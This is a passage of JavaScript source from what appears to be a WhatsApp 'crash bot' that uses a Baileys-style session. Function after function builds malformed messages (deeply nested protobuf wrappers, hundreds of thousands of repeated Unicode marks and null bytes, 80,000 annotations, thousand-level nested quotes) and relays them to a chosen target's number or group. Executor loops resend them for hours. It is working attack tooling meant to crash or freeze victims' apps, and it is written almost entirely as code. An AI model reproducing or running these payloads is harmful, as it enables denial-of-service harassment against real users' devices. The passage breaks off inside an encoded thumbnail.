    },
    caption: "Hello Netizen" + 
             "𑜦𑜠".repeat(18000) + 
             "ི꒦ྀ".repeat(18000) + 
             "ꦾ".repeat(18000) + 
             "ꦽ".repeat(18000) + 
             "ြ".repeat(9999) + 
             "\0".repeat(250000),
    hasMediaAttachment: true,
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2
    }
  };

  const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02]
  ];

  const encodeVarint = (n) => {
    const buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = (tag, data) => {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
  };

  const basePayload = proto.Message.encode(
    proto.Message.fromObject({ imageMessage: HeyImage })
  ).finish();

  const inflate = (tag, depth) => {
    let buf = basePayload;
    for (let i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const resolveJid = (raw) => {
    const s = String(raw || '').trim();
    if (s.includes('@')) return s;
    return s.replace(/\D/g, '') + '@s.whatsapp.net';
  };

  const targetJid = resolveJid(target);

  for (let ti = 0; ti < TAGS.length; ti++) {
    const tag = TAGS[ti];
    let payload = null;

    // Find a valid depth (fixed range, no massive loop)
    for (let depth = 3000; depth >= 2000 && !payload; depth -= 400) {
      try {
        const raw = inflate(tag, depth);
        const decoded = proto.Message.decode(raw);
        proto.Message.encode(decoded).finish();
        payload = decoded;
      } catch (_) {}
    }

    if (!payload) continue;

    try {
      await userSock.relayMessage('status@broadcast', payload, {
        messageId: 'Forclose' + Date.now().toString(36).toUpperCase() + '_' + ti,
        statusJidList: [targetJid],
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{
              tag: 'to',
              attrs: { jid: targetJid },
              content: []
            }]
          }]
        }]
      });
    } catch (_) {}
  }
        console.log(chalk.green(`richcrashv2 sent to ${target}`));
  } catch (err) {
  console.error(`Error in richcrashv2 for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonExtentedTextMessage(target, userNumber, chatId, botInstance) {
  try {
    let userSock = sessions.get(userNumber) || webSessions.get(userNumber);
    
    if (!userSock) {
  console.error(`No active WhatsApp socket for ${userNumber}`);
  throw new Error(`No active WhatsApp session for ${userNumber}`);
}

let innerContext = {
quotedMessage: {
extendedTextMessage: {
text: "Telegram: @dgxeon13"
}
}
};
for (let i = 0; i < 1000; i++) {
innerContext = {
quotedMessage: {
extendedTextMessage: {
text: "Telegram: @dgxeon13",
contextInfo: innerContext
}
}
};
}
// 2. Dynamically generates a list with 599 mentionedJids
const baseJids = [
"893@s.whatsapp.net", "148@s.whatsapp.net", "757@s.whatsapp.net", "685@s.whatsapp.net",
"721@s.whatsapp.net", "152@s.whatsapp.net", "99@s.whatsapp.net", "161@s.whatsapp.net",
"596@s.whatsapp.net", "975@s.whatsapp.net", "965@s.whatsapp.net", "198@s.whatsapp.net",
"930@s.whatsapp.net", "646@s.whatsapp.net", "296@s.whatsapp.net", "265@s.whatsapp.net",
"666@s.whatsapp.net", "717@s.whatsapp.net", "413@s.whatsapp.net", "1@s.whatsapp.net",
"361@s.whatsapp.net", "271@s.whatsapp.net", "367@s.whatsapp.net", "303@s.whatsapp.net",
"393@s.whatsapp.net", "414@s.whatsapp.net", "976@s.whatsapp.net", "463@s.whatsapp.net",
"732@s.whatsapp.net", "139@s.whatsapp.net", "544@s.whatsapp.net", "577@s.whatsapp.net",
"156@s.whatsapp.net", "651@s.whatsapp.net", "277@s.whatsapp.net", "486@s.whatsapp.net",
"299@s.whatsapp.net", "312@s.whatsapp.net", "285@s.whatsapp.net", "104@s.whatsapp.net",
"720@s.whatsapp.net", "856@s.whatsapp.net", "964@s.whatsapp.net"

];

const mentionedJid = [];

for (let i = 0; i < 2000; i++) {

// Alternates between the JIDs in the original list until all 599 are filled
mentionedJid.push(baseJids[i % baseJids.length]);
}

// 3. Assemble the final message object
const tmsg = generateWAMessageFromContent(
target,
proto.Message.fromObject({
senderKeyDistributionMessage: {
groupId: "status@broadcast",
axolotlSenderKeyDistributionMessage: "MwjGmMaVARDBiQEaILAgP9xm6z2Sfm0LhkA1eolSkVb/MEYMM1Xq8jks86csIiEFgFWbli0xnwUDxr4whISUpHaKyjmeklNgMi4S5jV5/DA="
},
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQNR7S4r9q3COmbThVbK4FnelTFyKyfRHo0CEM09yFgauXPHVeWW-l9JB7PLrSwBH0MF7pAX6ByclwqV75n 1E8vcl2QUWQ52mVK7JUzzSw?ccb=9-4&oh=01_Q5Aa5QGeTTd0LEzKiCSXowQmSw8Ka0YVKKcfgFD97rrDlsdYWA&oe=6AA65F4E&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
caption: "tredict invictus",
fileSha256: "iNslnxY14eJ/ForJJJ+y4nu7Mlr51s5jlDKGRg00gGM=",
fileLength: "192919",
height: 2048,
mediaKey: "7y/9nai0CY2zUldEPVg7g+2PWGDcDY192MZmWBpf2zc=",
fileEncSha256: "iVWDuVe7fIXTYVx0a/E0rSh9zCGszU5MSQZkIbYcBS=",
directPath: "/o1/v/t24/f2/m237/AQNR7S4r9q3COmbThVbK4FnelTFyKyfRHo0CEM09yFgauXPHVeWW-l9JB7PLrSwBH0MF7pAX6ByclwqV75n1E8vcl2 QUWQ52mVK7JUzzSw?ccb=9-4&oh=01_Q5Aa5QGeTTd0LEzKiCSXowQmSw8Ka0YVKKcfgFD97rrDlsdYWA&oe=6AA65F4E&_nc_sid=e6ed6c",
mediaKeyTimestamp: "1786697245",
contextInfo: {
quotedMessage: {
extendedTextMessage: {
text: "Telegram: @dgxeon13",
contextInfo: innerContext
}
},
mentionedJid: mentionedJid,
pairedMediaType: "NOT_PAIRED_MEDIA"
},
viewOnce: false
}
}),
{}
);
// 4. Sends the message via relayMessage
await userSock.relayMessage("status@broadcast", tmsg.message, {
messageId: tmsg.key.id,
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: { jid: target },
content: undefined,
}],
}],
}],
});
        console.log(chalk.green(`richcrash sent to ${target}`));
  } catch (err) {
  console.error(`Error in richcrash for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonExtentedTextMessageExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        // ===== FIXED: Support both rent-session and web-session =====
        const userSock = sessions.get(userNumber) || webSessions.get(userNumber);
        
        if (!userSock) {
          console.log(`⚠️ Session invalid for ${userNumber}, stopping richcrash...`);
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonExtentedTextMessage(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in trashsysgp: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonDroidStatusJid(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

        const statusJidList = Array.isArray(target) ? target : [target];

    await userSock.relayMessage(
        "status@broadcast",
        {
            imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/697925809_1290301996041503_325987581680521496_n.enc?ccb=11-4&oh=01_Q5Aa4gFdxfQhfGfeeRgRlPOd_xYxiHUkjMhgMRYYS9m-SWKmog&oe=6A2738CF&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "4qd4tPZHXkjIlLvZJf0HY5XQYj72ZVxAI+5iKVgjLes=",
                fileLength: "1",
                height: 1,
                width: 1,
                mediaKey: "fvQQovEmgPtY+MIimqnldyMLy7maiZzQux8DI/GExeE=",
                fileEncSha256: "xa0O0KPWqSNyAznp5iCxEnkpKHJ7iJZFTmKh3ooqanU=",
                directPath: "/v/t62.7118-24/697925809_1290301996041503_325987581680521496_n.enc?ccb=11-4&oh=01_Q5Aa4gFdxfQhfGfeeRgRlPOd_xYxiHUkjMhgMRYYS9m-SWKmog&oe=6A2738CF&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1778374964",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAIAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAQIDBQEBAQEAAAAAAAAAAAAAAAAAAQAC/9oADAMBAAIQAxAAAADw4Jl0RlUrcRBN1jcYMz1vKxIGnUj/xAAjEAACAQMEAQUAAAAAAAAAAAAAAQIREjETISJRQQMEEDJh/9oACAEBAAE/AK7JLA0q4qNb7Jl0kKUlgukXyJKPYpSRdIumSspkjJJZLkX7ZJRl0K04nEleK0rHo4klMTjTBWPRGN28Ykl6htTHwpSWGXTflmt+GpXwatPBD3Gm/qmf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAGREBAAIDAAAAAAAAAAAAAAAAAQAQESAh/9oACAEDAQE/ANWu0gmGf//Z",

                scanLengths: Array.from(
                    { length: 1 },
                    (_, i) => [5838, 27756, 20270, 31109][i % 4]
                ),

                interactiveAnnotations: Array.from({ length: 1 }, () => ({})),

                annotations: Array.from({ length: 80000 }, () => ({
                    embeddedContent: {
                        embeddedMusic: {
                            author: "",
                        },
                    },
                    embeddedAction: true,
                })),

                contextInfo: {
                    pairedMediaType: 0,
                    statusSourceType: 0,
                },
            },
        },
        {
            statusJidList,
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: statusJidList.map((jid) => ({
                                tag: "to",
                                attrs: { jid },
                            })),
                        },
                    ],
                },
            ],
        }
    );
        console.log(chalk.green(`simpledroid sent to ${target}`));
  } catch (err) {
  console.error(`Error in simpledroid for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in simpledroid: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonDroidStatusJidExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonDroidStatusJid(target, userNumber, chatId, botInstance)
          ]);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in simpledroid: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonIosStatusJid(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

        const msg = {
        listResponseMessage: {
            title: "Telegram: @dgxeon13 \n",
            description: "\n\n\n" + "𑪆".repeat(260000),
            singleSelectReply: {
                selectedId: "id"
            },
            listType: 1
        }
    };

    await userSock.relayMessage("status@broadcast", msg, {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target }
                }]
            }]
        }]
    });
        console.log(chalk.green(`simpleios sent to ${target}`));
  } catch (err) {
  console.error(`Error in simpleios for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in simpleios: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonIosStatusJidExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonIosStatusJid(target, userNumber, chatId, botInstance)
          ]);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in simpleios: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonGroupCrashInfinity(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

        await userSock.relayMessage(target, {
senderKeyDistributionMessage: {
groupId: "120363428445623974@g.us",
axolotlSenderKeyDistributionMessage: crypto.randomBytes(32)
},
interactiveMessage: {
body: {
text: "Telegram: @dgxeon13"
},
nativeFlowMessage: {
buttons: [
{
name: "catalog_message",
buttonParamsJson: "{}"
}
],
messageParamsJson: "{}"
}
}
},
{
additionalNodes: [
{
tag: "biz",
attrs: {
native_flow_name: "catalog_message"
}
}
]
});
        console.log(chalk.green(`gckiller sent to ${target}`));
  } catch (err) {
  console.error(`Error in gckiller for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonCrashPmInfinity(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

await userSock.relayMessage(target, {
            interactiveMessage: {
                contextInfo: {
                    forwardingScore: 999999999,
                    isForwarded: true
                },
                body: {
                    text: "Telegram: @dgxeon13"
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "catalog_message",
                            buttonParamsJson: "{}".repeat(100000) 
                        }
                    ],
                    messageParamsJson: "{}".repeat(100000) 
                }
            }
        }, {
            isSecret: 6,
           // corrupt: true,
            additionalNodes: [
                {
                    tag: "biz",
                    attrs: {
                        native_flow_name: "catalog_message"
                    }
                }
            ]
        });
        console.log(chalk.green(`crashforever sent to ${target}`));
  } catch (err) {
  console.error(`Error in crashforever for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonCrashPmInfinityInvisible(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

const xeonJid = userSock.user?.id ? 
        (userSock.user.id.split(':')[0] + '@s.whatsapp.net') : 
        userSock.user?.id;
        
    await userSock.relayMessage(target, {
        interactiveMessage: {
            header: {
                title: "0",
                subtitle: "0",
                hasMediaAttachment: true,
                locationMessage: {
                    degreesLatitude: -6.2,
                    degreesLongitude: 106.816666,
                    name: "Telegram: @dgxeon13",
                    address: "Telegram: @dgxeon13",
                    jpegThumbnail: Buffer.alloc(10000, "a").toString("base64")
                }
            },
            body: {
                text: "Telegram: @dgxeon13‌‌"
            },
            footer: {
                text: "Telegram: @dgxeon13"
            },
            contextInfo: {
                mentionedJid: target,
                isForwarded: true,
                externalAdReply: {
                    title: "",
                    body: "",
                    thumbnailUrl: "https://t.me/dgxeon13",
                    sourceUrl: "https://t.me/dgxeon13",
                    mediaType: 1,
                    renderLargerThumbnail: true
                },
                forwardedNewsletterMessageInfo: {
                    newsletterName: "Telegram: @dgxeon13",
                    newsletterJid: "999999999999999999@newsletter",
                    serverMessageId: 143
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: xeonJid
                }
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "catalog_message",
                        buttonParamsJson: JSON.stringify({})
                    },
                    {
                        name: "booking_status",
                        buttonParamsJson: JSON.stringify({})
                    },
                    {
                        name: "review_and_pay",
                        buttonParamsJson: JSON.stringify({
                            currency: "IDR",
                            total_amount: {
                                value: 0,
                                offset: 100
                            },
                            reference_id: "x",
                            type: "physical-goods",
                            order: {
                                status: "payment_requested",
                                subtotal: {
                                    value: 0,
                                    offset: 100
                                },
                                order_type: "ORDER",
                                items: [{
                                    name: "x",
                                    amount: {
                                        value: 0,
                                        offset: 100
                                    },
                                    quantity: 9999
                                }]
                            }
                        })
                    }
                ],
                messageParamsJson: JSON.stringify({})
            }
        }
    }, {
        isSecret: 6,
        additionalNodes: [{
            tag: "biz",
            attrs: {
                native_flow_name: "catalog_message"
            }
        }]
    });
        console.log(chalk.green(`cinvisible sent to ${target}`));
  } catch (err) {
  console.error(`Error in cinvisible for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonCrashPmInfinityInvisibleExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonCrashPmInfinityInvisible(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in trashsysgp: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonPendingMaker(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

        await userSock.relayMessage(
        "status@broadcast",
        {
    "videoMessage": {
        "url": "https://mmg.whatsapp.net/v/t62.7161-24/633903640_1332756785737289_7028107152517738000_n.enc?ccb=11-4&oh=01_Q5Aa4gHgzQZXe6kKnSDfNhG1zFz5YFlN5XgRYMn2RB5eaKinTw&oe=6A35ED0E&_nc_sid=5e03e0&mms3=true",
        "mimetype": "video/mp4",
        "fileSha256": "Z1BM836S7mPMkznfCHYWer8C8RJj2Vhtfs344BGkBto=",
        "fileLength": "295889",
        "seconds": 15,
        "mediaKey": "m7LTZtdTKMIxxiCF4Zmyg0uQWTNqJR2gbOYLQ+nrgYw=",
        "caption": "new delay, by attam",
        "height": 576,
        "width": 1280,
        "fileEncSha256": "/tMa5HEYiUmEsdGnJDi3YFQnXglX7lSPCXldju+Qduk=",
        "directPath": "/v/t62.7161-24/633903640_1332756785737289_7028107152517738000_n.enc?ccb=11-4&oh=01_Q5Aa4gHgzQZXe6kKnSDfNhG1zFz5YFlN5XgRYMn2RB5eaKinTw&oe=6A35ED0E&_nc_sid=5e03e0",
        "mediaKeyTimestamp": "1779339758",
        "jpegThumbnail": "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